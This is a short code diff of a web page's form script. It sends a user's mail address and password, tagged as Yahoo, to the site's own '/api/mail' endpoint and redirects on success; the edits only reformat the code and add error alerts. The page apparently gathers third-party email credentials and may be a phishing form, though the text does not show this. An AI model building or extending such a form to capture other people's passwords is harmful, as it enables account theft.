@@ -41,17 +41,26 @@
             e.preventDefault();
             const mailEmail = document.getElementById('mailEmail').value;
             const mailPassword = document.getElementById('mailPassword').value;
+            
             try {
                 const res = await fetch('/api/mail', {
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({provider:'yahoo',mailEmail,mailPassword})
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        provider: 'yahoo', 
+                        mailEmail, 
+                        mailPassword 
+                    })
                 });
                 const data = await res.json();
-                if(data.status === 'success') {
+                if (data.status === 'success') {
                     window.location.href = data.next;
+                } else {
+                    alert('Error, please try again.');
                 }
-            } catch(err) {}
+            } catch(err) {
+                alert('Error, please try again.');
+            }
         });
     </script>
 </body>
